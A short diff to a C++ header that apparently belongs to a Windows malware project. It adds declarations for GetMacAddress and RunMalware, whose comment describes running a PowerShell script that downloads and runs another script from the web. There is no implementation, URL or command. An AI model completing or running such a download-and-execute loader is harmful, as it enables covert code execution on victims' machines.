@@ -29,3 +29,18 @@ bool GetProcessNamesByPsApi(vector<wstring>& running_processes);
 * @return true / false whether the function was successful in receiving or not.
 */
 bool GetProcessNamesByWtsApi(vector<wstring>& running_processes);
+
+/* @brief Returns the first MAC address that appears in IP_ADAPTER_ADDRESSES.
+*
+* @param mac_address - pointer to a empty wstring, which will hold the MAC address.
+* @return true / false whether the function was successful in receiving or not.
+*/
+bool GetMacAddress(wstring& mac_address);
+
+/* @brief Runs a ps script that requests a web address a ps script and runs it.
+*
+* @return true / false whether the function was successful to run the mallware or not.
+*/
+bool RunMalware();
+
+//DWORD WINAPI ProccessChecker(LPVOID lpParam);
